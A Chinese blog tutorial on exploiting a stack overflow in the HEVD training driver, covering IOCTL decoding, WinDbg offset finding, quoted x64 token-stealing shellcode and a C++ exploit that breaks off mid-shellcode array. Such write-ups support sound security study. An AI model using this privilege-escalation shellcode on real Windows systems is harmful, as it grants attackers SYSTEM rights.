<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 从零探索现代windows内核栈溢出-以HEVD练习为例（中）</title><meta name="description" content="&lt;p&gt;在&lt;a href=&quot;&quot;&gt;上一篇&lt;/a&gt;中了解了与内核的交互模式，这里就可以开始做HEVD了&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">从零探索现代windows内核栈溢出-以HEVD练习为例（中）</h3><div class="article__date metadata"><div class="post-info">2024/01/25</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>在<a href="">上一篇</a>中了解了与内核的交互模式，这里就可以开始做HEVD了</p>
<span id="more"></span>
<h1 id="编写交互模块"><a class="markdownIt-Anchor" href="#编写交互模块"></a> 编写交互模块</h1>
<h2 id="a-计算io_ctl值"><a class="markdownIt-Anchor" href="#a-计算io_ctl值"></a> A. 计算IO_CTL值</h2>
<p><strong>其实不用这步，但是可以当作更多的了解</strong></p>
<p>在之前的交互中有这么一条定义功能号</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure>
<p>但是…HEVD逆向会发现是这样的</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117184722533.png" alt="image-20240117184722533" /></p>
<p>发现<code>CTL_CODE</code>也是个宏定义</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure>
<p>其中，这里</p>
<ul>
<li>DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22</li>
<li>Function -&gt; = 0x9888</li>
<li>Method -&gt; METHOD_BUFFERED=0</li>
<li>Access -&gt; FILE_ANY_ACCESS=0</li>
</ul>
<p>表达式就为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0</span><br><span class="line">= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0</span><br><span class="line">= 0x220000 | 0x9888 &lt;&lt; 2</span><br><span class="line">= 0x226220</span><br></pre></td></tr></table></figure>
<p>很容易得到逆向，这里以<code>0x226220</code>为例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x205B = 0x22205B ^ 0x220000</span><br><span class="line">0x816 = 0x205B&gt;&gt;2</span><br></pre></td></tr></table></figure>
<p>那么对应的函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">io2num</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ioctl_num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ioctl_num ^ <span class="number">0x220000</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xfff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面之所以要&amp;一下是因为数据的大小就只有那么大，所以<strong>II文章</strong>的描述符<code>0x9888</code>实际有效的只有<code>0x888</code></p>
<h2 id="b-功能选择"><a class="markdownIt-Anchor" href="#b-功能选择"></a> B. 功能选择</h2>
<p>这里就以最简单的内核栈溢出举例子</p>
<p>每开始一个漏洞利用就编写一个菜单，然后选择解析逆向出来的功能描述符，运行对应函数，没啥好讲的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;============HEVD Hack EXP============\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input io ctl&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> io_ctl = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;io_ctl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x&quot;</span>, io_ctl, <span class="built_in">io2num</span>(io_ctl));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (io_ctl)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Now Excuting ...\n&quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n&quot;</span>;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// EXP FUNCTION HERE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="c-简单与功能交互"><a class="markdownIt-Anchor" href="#c-简单与功能交互"></a> C. 简单与功能交互</h2>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117192837142.png" alt="image-20240117192837142" /></p>
<p>这里要传一个空间和大小过去，这里用的到方式就是上一篇的IOCTL方式</p>
<p>这里我把所有的exp定义在<code>exp.c</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x50</span>] = <span class="string">&quot;aaaaa\0&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x30</span>;</span><br><span class="line">	DWORD info = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl, stackspace, <span class="built_in">sizeof</span>(DWORDLONG), &amp;size, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117195630472.png" alt="image-20240117195630472" /></p>
<p>驱动定义了一个2048大小的栈空间<code>v5</code>，但是写入的空间是我们可以控制的，尝试触发漏洞</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x1000</span>;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	DWORD info = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">		stackspace, size, </span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117202959678.png" alt="image-20240117202959678" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117211228964.png" alt="image-20240117211228964" /></p>
<h2 id="d-开始调试"><a class="markdownIt-Anchor" href="#d-开始调试"></a> D. 开始调试</h2>
<p>之前符号表好像没加载上，在windbg中，HEVD的描述符一般在同级文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath+ &lt;pdb文件物理机上的路径&gt;</span><br></pre></td></tr></table></figure>
<p>然后再</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117224344703.png" alt="image-20240117224344703" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /D /f HEVD!*</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117224429242.png" alt="image-20240117224429242" /></p>
<p>下个断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure>
<p>这里运行下不崩溃的</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117224828729.png" alt="image-20240117224828729" /></p>
<h3 id="i-windbg-调试常用"><a class="markdownIt-Anchor" href="#i-windbg-调试常用"></a> I. Windbg 调试常用</h3>
<p>在使用Windbg调试内核驱动程序时，你可以使用以下命令查看内存地址：</p>
<ul>
<li>
<p>64位查看内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dq &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>64位查看内存，单列显示，这在查看栈的情况是比较好用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqs &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在某处添加断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;内存虚拟地址&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;模块名&gt;!&lt;函数名&gt;</span><br><span class="line">//bp: break point 如 bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看所有断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>快速反汇编，适合查看gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u &lt;内存地址&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>反汇编该地址对应的一段汇编，适合反汇编这段函数后选择断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uf &lt;内存地址&gt;</span><br><span class="line">uf &lt;模块名&gt;!&lt;函数名&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>计算器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? &lt;计算表达式&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="ii-内存布局"><a class="markdownIt-Anchor" href="#ii-内存布局"></a> II. 内存布局</h3>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117225628917.png" alt="image-20240117225628917" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	DWORD info = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">		stackspace, size, </span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果引发溢出的话，看看kernel中的<code>v5</code>变量的布局</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117231239916.png" alt="image-20240117231239916" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117231345354.png" alt="image-20240117231345354" /></p>
<p>这里的kernelBuffer就相当于用户模式下的“栈帧”</p>
<p>同时可以看到我们程序的内存</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117235653641.png" alt="image-20240117235653641" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117235638456.png" alt="image-20240117235638456" /></p>
<p>这个时候顺便看一下rbp</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117231511587.png" alt="image-20240117231511587" /></p>
<p>在<code>pop</code>前下断点再运行到</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240117234330859.png" alt="image-20240117234330859" /></p>
<p>所以是rsp+0x20+0x818就得到ret的地址</p>
<p>很明显这里可以通过栈溢出劫持返回地址，然后实现我们的shellcode</p>
<h3 id="iii-布置构思"><a class="markdownIt-Anchor" href="#iii-布置构思"></a> III. 布置构思</h3>
<ul>
<li>首先 <strong>驱动是64位</strong>，所以要用64位的思维去布局</li>
<li>其次，驱动和我们的程序内存之间是能访问的，所以我们在Ring3写shellcode，然后覆盖到Ring0去执行</li>
</ul>
<p>那么就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">0x810</span>+p64(shellcode_addr)</span><br></pre></td></tr></table></figure>
<h1 id="shellcodeexp编写"><a class="markdownIt-Anchor" href="#shellcodeexp编写"></a> Shellcode+exp编写</h1>
<h2 id="a-shellcode"><a class="markdownIt-Anchor" href="#a-shellcode"></a> A. shellcode</h2>
<p>主要是用这篇：<a target="_blank" rel="noopener" href="https://blog.xpnsec.com/hevd-stack-overflow/">Exploiting Windows 10 Kernel Drivers - Stack Overflow</a> 或者里面参考的两篇</p>
<p>主要目的就是拿去Token然后替换掉一个cmd.exe的Token实现提权，<strong>在下一篇文章中会详细提到</strong></p>
<blockquote>
<p>This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rcx</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">mov rax, [gs:0x180 + 0x8]   ; Get &#x27;CurrentThread&#x27; from KPRCB</span><br><span class="line"></span><br><span class="line">mov rax, [rax + 0x220]       ; Get &#x27;Process&#x27; property from current thread</span><br><span class="line"></span><br><span class="line">next_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x41414141  ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)</span><br><span class="line">je found_cmd_process</span><br><span class="line">mov rax, [rax + 0x2e8]            ; If not found, go to next process</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp next_process</span><br><span class="line"></span><br><span class="line">found_cmd_process:</span><br><span class="line">mov rbx, rax                     ; Save our cmd.exe EPROCESS for later</span><br><span class="line"></span><br><span class="line">find_system_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x00000004  ; Search for PID 4 (System process)</span><br><span class="line">je found_system_process</span><br><span class="line">mov rax, [rax + 0x2e8]</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp find_system_process</span><br><span class="line"></span><br><span class="line">found_system_process:</span><br><span class="line">mov rcx, [rax + 0x358]            ; Take TOKEN from System process</span><br><span class="line">mov [rbx+0x358], rcx              ; And copy it to the cmd.exe process</span><br><span class="line"></span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line">; return goes here</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="b-exp"><a class="markdownIt-Anchor" href="#b-exp"></a> B. EXP</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> shellcode[<span class="number">256</span>] = &#123;</span><br><span class="line">		<span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x25</span>,</span><br><span class="line">		<span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line">		<span class="number">0x41</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">		<span class="number">0xc3</span>, <span class="number">0x83</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>,</span><br><span class="line">		<span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>,</span><br><span class="line">		<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0x03</span>,</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5f</span>,</span><br><span class="line">		<span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span 